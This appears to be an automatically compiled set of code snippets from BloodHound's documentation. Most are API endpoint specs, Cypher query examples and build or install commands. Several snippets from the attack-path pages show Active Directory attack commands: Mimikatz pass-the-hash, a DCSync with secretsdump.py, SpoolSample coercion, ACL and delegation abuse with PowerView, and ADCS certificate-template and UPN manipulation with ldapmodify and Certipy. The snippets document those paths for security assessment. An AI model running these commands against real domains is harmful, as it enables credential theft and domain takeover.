https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-azurehound/installation-options.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\nazurehound.exe start\n```\n\n----------------------------------------\n\nTITLE: Retrieving User Sessions by Object ID in BloodHound API\nDESCRIPTION: OpenAPI endpoint specification for fetching all sessions associated with a specific user identified by their object ID. This endpoint is supported in both the enterprise and community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-sessions.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/sessions\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Group RDP Rights in BloodHound\nDESCRIPTION: This YAML snippet specifies the OpenAPI definition for the GET /api/v2/groups/{object_id}/rdp-rights endpoint. It defines the path, method, and indicates that this endpoint is available in both Enterprise and Community editions of BloodHound.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-rdp-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/rdp-rights\n```\n\n----------------------------------------\n\nTITLE: Setting msDS-AllowedToActOnBehalfOfOtherIdentity Attribute\nDESCRIPTION: Uses PowerView to modify the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute with the previously created security descriptor. This allows the attacker-controlled machine account to perform delegation to the target.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/allowed-to-act.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nGet-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n```\n\n----------------------------------------\n\nTITLE: Retrieving GMSA NT Hash using GMSAPasswordReader\nDESCRIPTION: Using GMSAPasswordReader.exe to obtain the NT hash for a GMSA account. This command retrieves both current and old password hashes for the specified GMSA account.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/read-gmsa-password.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\ngmsapasswordreader.exe --accountname gmsa-jkohler\n```\n\n----------------------------------------\n\nTITLE: Basic Cypher Query Pattern in BloodHound\nDESCRIPTION: A simple Cypher query that matches any node B with a relationship A to node R, then returns node B. This demonstrates the basic structure of Cypher queries using the MATCH and RETURN keywords.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/analyze-data/bloodhound-gui/cypher-search.mdx#2025-04-23_snippet_0\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (B)-[A]->(R) RETURN B\n```\n\n----------------------------------------\n\nTITLE: Managing EKU with LDAP in Linux\nDESCRIPTION: Collection of LDAP commands to check and modify certificate template EKU attributes in Linux environment. Includes commands for querying current values and setting new EKU values.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc4.mdx#2025-04-23_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" msPKI-Certificate-Application-Policy\n```\n\nLANGUAGE: bash\nCODE:\n```\nldapsearch -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME -b \"TEMPLATE-DN\" pKIExtendedKeyUsage\n```\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: msPKI-Certificate-Application-Policy\\nmsPKI-Certificate-Application-Policy: 1.3.6.1.5.5.7.3.2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: pKIExtendedKeyUsage\\npKIExtendedKeyUsage: 1.3.6.1.5.5.7.3.2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\nLANGUAGE: bash\nCODE:\n```\necho -e \"dn: TEMPLATE-DN\\nchangetype: modify\\nreplace: ATTRIBUTE\\nATTRIBUTE: EKU1\\nATTRIBUTE: EKU2\" | ldapmodify -x -D \"ATTACKER-DN\" -w 'PWD' -h DOMAIN-DNS-NAME\n```\n\n----------------------------------------\n\nTITLE: Complete ASP Query Translation Example\nDESCRIPTION: Demonstrates the complete translation of an openCypher query to PostgreSQL using the ASP harness. Shows how to construct the primer query, recursive query, and final path assembly.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/models/pgsql/translate/README.md#2025-04-23_snippet_10\n\nLANGUAGE: postgresql\nCODE:\n```\nwith s0 as (with ex0(root_id, next_id, depth, satisfied, is_cycle, path)\n                     as (select * from asp_harness(@pi0::text, @pi1::text, 5))\n            select (n0.id, n0.kind_ids, n0.properties)::nodecomposite as n0,\n                   (select array_agg((e0.id, e0.start_id, e0.end_id, e0.kind_id, e0.properties)::edgecomposite)\n                    from edge e0\n                    where e0.id = any (ex0.path))                     as e0,\n                   ex0.path                                           as ep0,\n                   (n1.id, n1.kind_ids, n1.properties)::nodecomposite as n1\n            from ex0\n                     join edge e0 on e0.id = any (ex0.path)\n                     join node n0 on n0.id = ex0.root_id\n                     join node n1 on e0.id = ex0.path[array_length(ex0.path, 1)::int4] and n1.id = e0.end_id)\nselect edges_to_path(variadic ep0)::pathcomposite as p\nfrom s0;\n```\n\n----------------------------------------\n\nTITLE: Targeting Specific OU with SharpHound\nDESCRIPTION: Command to limit SharpHound collection to a specific Organizational Unit using the DistinguishedName parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/sharphound-flags.mdx#2025-04-23_snippet_3\n\nLANGUAGE: batch\nCODE:\n```\nC:\\> SharpHound.exe --DistinguishedName \"OU=New York,DC=Contoso,DC=Local\"\n```\n\n----------------------------------------\n\nTITLE: Testing gMSA Password Retrieval\nDESCRIPTION: PowerShell script to test if the server can retrieve the gMSA password\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_7\n\nLANGUAGE: powershell\nCODE:\n```\n$gmsaName = \"t0\\_gMSA\\_SHS\" # Name of the gMSA\n\nTest-ADServiceAccount -Identity $gmsaName\n```\n\n----------------------------------------\n\nTITLE: Using Regular Expression Matching with Backreference in Cypher\nDESCRIPTION: This Cypher query demonstrates the use of regular expression matching with a backreference, which is weighted higher in the cost model due to unknown performance characteristics.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_10\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (p:Person) where p.favorite_quote =~ \"(['\\\"])(.*?)\\\\1\" return p\n```\n\n----------------------------------------\n\nTITLE: Creating PSCredential Object for Authentication in PowerShell\nDESCRIPTION: This snippet demonstrates how to create a PSCredential object in PowerShell, which is used for authenticating to a Domain Controller when performing actions that require elevated privileges.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-spn.mdx#2025-04-23_snippet_0\n\nLANGUAGE: powershell\nCODE:\n```\n$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)\n```\n\n----------------------------------------\n\nTITLE: Purging Kerberos Tickets (Windows)\nDESCRIPTION: This optional command purges all Kerberos tickets from memory.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc1.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nklist purge\n```\n\n----------------------------------------\n\nTITLE: Retrieving Computers Associated with a GPO via REST API\nDESCRIPTION: API endpoint specification for getting a list of computers associated with a specific Group Policy Object (GPO) using its object_id. This endpoint is available in both BloodHound Enterprise and Community editions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/gpos/get-gpo-entity-computer.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/gpos/{object_id}/computers\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for OU Users in BloodHound\nDESCRIPTION: YAML specification for a GET API endpoint to retrieve users associated with a specific Organizational Unit (OU) in BloodHound. The endpoint path includes a variable 'object_id' to specify the target OU.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ous/get-ou-entity-users.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/ous/{object_id}/users\n```\n\n----------------------------------------\n\nTITLE: Exploiting RDP Access with Password Hash and Interactive Access using Mimikatz\nDESCRIPTION: This command uses mimikatz to inject an NTLM credential hash into memory and launch the Remote Desktop client in restricted admin mode. This method requires local administrator privileges and the target server must support Restricted Admin Mode.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/can-rdp.mdx#2025-04-23_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nlsadump::pth /user:dfm /domain:testlab.local /ntlm:<ntlm hash> /run:\"mstsc.exe /restrictedadmin\"\n```\n\n----------------------------------------\n\nTITLE: Creating Secure String for New Password\nDESCRIPTION: Converts a plaintext password into a secure string object that will be used as the new password for the target user account.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/force-change-password.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition for Computer Object\nDESCRIPTION: OpenAPI specification defining the endpoint for retrieving computer details by object ID. The endpoint follows RESTful conventions for fetching individual computer resources.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}\n```\n\n----------------------------------------\n\nTITLE: GET Domain Outbound Trusts Endpoint Definition\nDESCRIPTION: OpenAPI specification for the endpoint that retrieves outbound trust relationships for a specified domain. The endpoint requires the domain's object_id as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-outbound-trusts.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/outbound-trusts\n```\n\n----------------------------------------\n\nTITLE: Converting Certificate to PFX Format (Windows)\nDESCRIPTION: Use certutil to convert the emitted certificate to PFX format.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc3.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\ncertutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx\n```\n\n----------------------------------------\n\nTITLE: Beagle Extension Example: Test and Build Plan Setup\nDESCRIPTION: Comprehensive example of setting up test and build plans in a Beagle extension, including imports, plan definitions, and initialization.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/python/beagle/README.md#2025-04-23_snippet_8\n\nLANGUAGE: python\nCODE:\n```\n# Import global plans so that beagle extensions can add to a registry of prepared plans available to run\nimport plans\n\n# Supporting beagle imports\nfrom beagle.plan import GolangWorkspaceBuildPlan, GolangWorkspaceTestPlan, CopyBloodHoundUIAssets, YarnTestPlan,\n\nYarnBuildPlan\nfrom beagle.project import ProjectContext\n\n\ndef init(project_ctx: ProjectContext) -> None:\n    \"\"\"\n    init is the beagle initializer function. This is the entry point for these particular extensions.\n    \n    :param project_ctx: the project context contains all context of the beagle environment, runtime and project files\n    :return:\n    \"\"\"\n    project_ctx.info(\"Community beagle extensions enabled\")\n\n    plans.build_plans = [\n        YarnBuildPlan(\n            name=\"bh-ui\",\n            source_path=project_ctx.fs.project_path(\"cmd\", \"ui\"),\n            project_ctx=project_ctx,\n        ),\n        GolangWorkspaceBuildPlan(\n            name=\"bh\",\n            project_ctx=project_ctx,\n            prepare_actions=[\n                CopyBloodHoundUIAssets(\n                    ui_build_name=\"bh-ui\",\n                    ce_root_path=project_ctx.fs.project_path(),\n                )\n            ],\n        ),\n    ]\n\n    plans.test_plans = [\n        YarnTestPlan(\n            name=\"bh-shared-ui\",\n            source_path=project_ctx.fs.project_path(\"packages\", \"javascript\", \"bh-shared-ui\"),\n            project_ctx=project_ctx,\n        ),\n        YarnTestPlan(\n            name=\"js-client-library\",\n            source_path=project_ctx.fs.project_path(\"packages\", \"javascript\", \"js-client-library\"),\n            project_ctx=project_ctx,\n        ),\n        YarnTestPlan(\n            name=\"bh-ui\",\n            source_path=project_ctx.fs.project_path(\"cmd\", \"ui\"),\n            project_ctx=project_ctx,\n        ),\n        GolangWorkspaceTestPlan(\n            name=\"bh\",\n            project_ctx=project_ctx,\n        ),\n    ]\n```\n\n----------------------------------------\n\nTITLE: Authenticating with JWT in AzureHound (JSON)\nDESCRIPTION: Example of using AzureHound with JWT authentication. It demonstrates the use of -j (JWT) and --tenant flags to authenticate and list Azure AD resources. Note that JWTs have a maximum lifespan of 90 minutes.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound-flags.mdx#2025-04-23_snippet_2\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -j \"ey...\" --tenant \"contoso.onmicrosoft.com\" list az-ad\n```\n\n----------------------------------------\n\nTITLE: Installing RSAT PowerShell Module\nDESCRIPTION: Command to install RSAT PowerShell module if not already installed\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/install-data-collector/install-sharphound/create-gmsa.mdx#2025-04-23_snippet_6\n\nLANGUAGE: powershell\nCODE:\n```\nGet-WindowsCapability -Name RSAT* -Online | Add-WindowsCapability -Online\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for GPO Retrieval in YAML\nDESCRIPTION: This YAML snippet specifies an OpenAPI endpoint for retrieving GPO information. It defines a GET request to '/api/v2/gpos/{object_id}' where {object_id} is a path parameter representing the unique identifier of the GPO to be fetched.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/gpos/get-gpo-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/gpos/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Verifying TGT in Windows\nDESCRIPTION: Uses the klist command to verify that the Ticket Granting Ticket (TGT) was successfully obtained and is present in the current session.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc6b.mdx#2025-04-23_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\nklist\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI GET Endpoint for Group Memberships\nDESCRIPTION: Specifies the OpenAPI path for retrieving group memberships using the group's object ID. The endpoint is accessible via GET /api/v2/groups/{object_id}/memberships.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-memberships.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/memberships\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Patching Domain Objects in BloodHound\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the endpoint that patches domain objects in BloodHound. The endpoint path parameters include the object_id of the domain to be modified.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/update-the-domain-entity.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /api/v2/domains/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Coercing DC Authentication using SpoolSample in Windows\nDESCRIPTION: This command uses SpoolSample to coerce a target Domain Controller to authenticate to a compromised computer using the printspooler service.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nSpoolSample.exe <target DC DNS name> <compromised computer DNS name>\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Certificate using Certipy in Linux\nDESCRIPTION: Uses Certipy to authenticate to a Domain Controller with the obtained certificate, impersonating the target computer and retrieving a Kerberos TGT.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc9b.mdx#2025-04-23_snippet_16\n\nLANGUAGE: bash\nCODE:\n```\ncertipy auth -pfx TARGET.pfx -dc-ip IP\n```\n\n----------------------------------------\n\nTITLE: Chained Pattern Expansion with Greedy Range Literal in Cypher\nDESCRIPTION: This Cypher query demonstrates the highest-cost scenario of using chained pattern expansion with a greedy range literal.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_18\n\nLANGUAGE: cypher\nCODE:\n```\nmatch p1 = (:Company)<-[:WorksFor]-(p2:Person)-[:Knows *1..]->(:Person)-[:WorksFor]->(:Company) where p2.name = \"Jim\" return p1\n```\n\n----------------------------------------\n\nTITLE: Setting Victim UPN to Target Principal\nDESCRIPTION: Updates the User Principal Name (UPN) of the victim account to match the target principal's sAMAccountName using Certipy\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe account update -u ATTACKER@CORP.LOCAL -p PWD -user VICTIM -upn Target@CORP.LOCAL\n```\n\n----------------------------------------\n\nTITLE: Adding Glyph Node in Sigmajs for BloodHound\nDESCRIPTION: Shows how to add a glyph node type, which is a modification of the combined type. It allows rendering up to 4 glyphs around the edge of the node. Glyph types are defined in the constants.ts file.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/cmd/ui/src/rendering/RENDERING.md#2025-04-23_snippet_1\n\nLANGUAGE: javascript\nCODE:\n```\ngraph.addNode(key, {\n    x: 10,\n    y: 20,\n    size: 30,\n    type: 'glyphs',\n    borderColor: '#000000',\n    image: './icons/computer.svg',\n    glyphs: [\n        {\n            location: GlyphLocation.TOP_RIGHT,\n            image: `./icons/${GLYPHS.tierZero.icon.iconName}.svg`,\n            backgroundColor: GLYPHS.tierZero.background,\n        },\n    ]\n});\n```\n\n----------------------------------------\n\nTITLE: Updating BloodHound CE\nDESCRIPTION: Commands for updating BloodHound Community Edition using bloodhound-cli across different operating systems.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_12\n\nLANGUAGE: bash\nCODE:\n```\n./bloodhound-cli update\n```\n\nLANGUAGE: powershell\nCODE:\n```\n.\\bloodhound-cli update\n```\n\nLANGUAGE: bash\nCODE:\n```\n./bloodhound-cli update\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition - User SQL Admin Rights\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves SQL admin rights for a specific user identified by their object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-sql-admin-rights.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/sql-admin-rights\n```\n\n----------------------------------------\n\nTITLE: Retrieving Root CA Information by Object ID in BloodHound API\nDESCRIPTION: This OpenAPI specification defines an endpoint to get information about a specific Root Certificate Authority (Root CA) by its unique object identifier. The endpoint follows the pattern '/api/v2/rootcas/{object_id}' where 'object_id' is the unique identifier for the Root CA being requested.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/root-cas/get-root-ca-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/rootcas/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Linux GPLink Exploitation Tool Reference\nDESCRIPTION: From Linux systems, the WriteGPLink permission can be exploited using the OUned.py tool to manipulate organizational unit ACLs and apply malicious GPOs.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-gp-link.mdx#2025-04-23_snippet_1\n\n\n\n----------------------------------------\n\nTITLE: Initiating Device Code Flow for Azure Authentication (PowerShell)\nDESCRIPTION: This PowerShell script initiates the device code flow for Azure authentication, useful when dealing with MFA or CAP restrictions.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound.mdx#2025-04-23_snippet_3\n\nLANGUAGE: powershell\nCODE:\n```\n$body = @{\n    \"client_id\" =     \"1950a258-227b-4e31-a9cf-717495945fc2\"\n    \"resource\" =      \"https://graph.microsoft.com\"\n}\n$UserAgent = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10\\_15\\_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36\"\n$Headers=@{}\n$Headers[\"User-Agent\"] = $UserAgent\n$authResponse = Invoke-RestMethod `\n    -UseBasicParsing `\n    -Method Post `\n    -Uri \"https://login.microsoftonline.com/common/oauth2/devicecode?api-version=1.0\" `\n    -Headers $Headers `\n    -Body $body\n$authResponse\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Specification for Domain DCSync Users Endpoint\nDESCRIPTION: API specification for retrieving users with DCSync privileges for a specified domain, using the object_id as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/domains/get-domain-entity-dc-syncers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{object_id}/dc-syncers\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Certificate Template in OpenAPI\nDESCRIPTION: Specifies the OpenAPI schema for a GET request to retrieve certificate template details by object ID. The endpoint path includes a parameter for the object ID.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/cert-templates/get-cert-template-entity-info.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/certtemplates/{object_id}\n```\n\n----------------------------------------\n\nTITLE: Converting TGT to ccache Format in Linux\nDESCRIPTION: These commands save the captured TGT as a .kirbi file, convert it to ccache format, and set the KRB5CCNAME environment variable for use in Linux.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_5\n\nLANGUAGE: bash\nCODE:\n```\necho \"doIFvjCCBbqgAwI...\" | base64 -d | tee ticket.kirbi > /dev/null\\nticketConverter.py ticket.kirbi ticket.ccache\\nexport KRB5CCNAME=$path_to_ticket.ccache\n```\n\n----------------------------------------\n\nTITLE: Exploiting WriteDacl on OU Objects in Active Directory using PowerView\nDESCRIPTION: This command uses PowerView's Add-DomainObjectAcl to grant yourself full control over an OU using its GUID, allowing control over objects within that OU.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-dacl.mdx#2025-04-23_snippet_5\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-DomainObjectAcl -TargetIdentity (OU GUID) -Rights All\n```\n\n----------------------------------------\n\nTITLE: Node Lookup with Label in Where Clause in Cypher\nDESCRIPTION: This Cypher query demonstrates a lower cost node lookup with labels specified in the where clause. The analyzer adjusts the query cost based on label narrowing later in the query.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_4\n\nLANGUAGE: cypher\nCODE:\n```\nmatch (n) where n:Label1 or n:Label2 return n;\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Definition for Getting Computer Controllables\nDESCRIPTION: Defines the API endpoint for retrieving objects that can be controlled by a specific computer. The endpoint uses a GET request pattern with the computer's object_id as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/computers/get-computer-entity-controllables.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/computers/{object_id}/controllables\n```\n\n----------------------------------------\n\nTITLE: Exploiting WriteDacl on Computer Objects in Active Directory using PowerView\nDESCRIPTION: This command uses PowerView's Add-DomainObjectAcl to grant yourself full control over a computer object, allowing various attack paths like resource-based constrained delegation.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/write-dacl.mdx#2025-04-23_snippet_2\n\nLANGUAGE: powershell\nCODE:\n```\nAdd-DomainObjectAcl -TargetIdentity windows1 -Rights All\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Certificate\nDESCRIPTION: Performs Schannel authentication against a Domain Controller using the acquired certificate through Certipy\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10a.mdx#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nCertipy.exe auth -pfx TARGET.pfx -dc-ip IP -ldap-shell\n```\n\n----------------------------------------\n\nTITLE: Installing BloodHound CE on Linux/Mac\nDESCRIPTION: Command to install BloodHound Community Edition using BloodHound CLI on Linux or Mac systems.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/get-started/quickstart/community-edition-quickstart.mdx#2025-04-23_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n./bloodhound-cli install\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Available Types in BloodHound API (YAML)\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint that retrieves available types for a specific domain. It includes the endpoint path and an Enterprise Edition tag.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/attack-paths/list-available-attack-paths.mdx#2025-04-23_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /api/v2/domains/{domain_id}/available-types\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Group Sessions in BloodHound API\nDESCRIPTION: OpenAPI specification for the GET endpoint that retrieves sessions associated with a specific group. The endpoint requires the group's object_id as a path parameter.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/groups/get-group-entity-sessions.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/groups/{object_id}/sessions\n```\n\n----------------------------------------\n\nTITLE: Authenticating with Refresh Token in AzureHound (JSON)\nDESCRIPTION: Example of using AzureHound with refresh token authentication. It shows the usage of -r (refresh token) and --tenant flags to authenticate and list Azure resources. AzureHound automatically exchanges the refresh token for an appropriate JWT.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/collect-data/ce-collection/azurehound-flags.mdx#2025-04-23_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n./azurehound -r \"0.ARwA6Wg...\" --tenant \"contoso.onmicrosoft.com\" list\n```\n\n----------------------------------------\n\nTITLE: Querying OU Groups API Endpoint - OpenAPI\nDESCRIPTION: OpenAPI specification for the endpoint that retrieves groups associated with an Organizational Unit. Uses the object_id parameter to identify the specific OU.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ous/get-ou-entity-groups.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/ous/{object_id}/groups\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Endpoint Definition - User Controllers\nDESCRIPTION: OpenAPI specification defining a GET endpoint that retrieves controller information for a specific user identified by their object_id\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/reference/ad-users/get-user-entity-controllers.mdx#2025-04-23_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: get /api/v2/users/{object_id}/controllers\n```\n\n----------------------------------------\n\nTITLE: Performing DCSync Attack using secretsdump.py in Linux\nDESCRIPTION: This command uses secretsdump.py to perform a DCSync attack from a Linux environment, extracting user credentials from the Domain Controller.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/coerce-to-tgt.mdx#2025-04-23_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\nsecretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>\n```\n\n----------------------------------------\n\nTITLE: Requesting TGT with Certipy in Linux\nDESCRIPTION: Uses Certipy to request a TGT for the targeted principal using the forged certificate against a specified DC.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/golden-cert.mdx#2025-04-23_snippet_6\n\nLANGUAGE: Bash\nCODE:\n```\ncertipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10\n```\n\n----------------------------------------\n\nTITLE: Conditional Logic with CASE Statements\nDESCRIPTION: Shows how to use CASE expressions for conditional value assignment based on node properties.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/packages/go/cypher/README.md#2025-04-23_snippet_37\n\nLANGUAGE: cypher\nCODE:\n```\nMATCH (V)\nRETURN CASE V.eyes\n  WHEN 'blue'  THEN 1\n  WHEN 'brown' THEN 2\n  ELSE 3\nEND AS result\n```\n\n----------------------------------------\n\nTITLE: Creating Executable Version of Certipy with PyInstaller\nDESCRIPTION: This command bundles the Certipy Python project into an executable file using PyInstaller. This allows Certipy to be used on Windows systems without Python installed.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/docs/resources/edges/adcs-esc10b.mdx#2025-04-23_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\npyinstaller ./Certipy.spec\n```\n\n----------------------------------------\n\nTITLE: Formatting RFC Motivation & Goals Section in Markdown\nDESCRIPTION: Example of how to structure the Motivation & Goals section of a BloodHound RFC, including contextual information and a bulleted list of goals.\nSOURCE: https://github.com/specterops/bloodhound/blob/main/rfc/bh-rfc-0.md#2025-04-23_snippet_3\n\nLANGUAGE: markdown\nCODE:\n```\n```markdown\n## 2. Motivation & Goals\n\nRFCs should invite respectful discussion and serve as a means to encode, review, and reach decisions by consensus. As such, a set of standards is required to describe how to properly author a RFC with the following goals:\n\n- **Consistency** - Ensure all RFCs follow a standard structure and style, making them easy to read, maintain, and discover.\n- 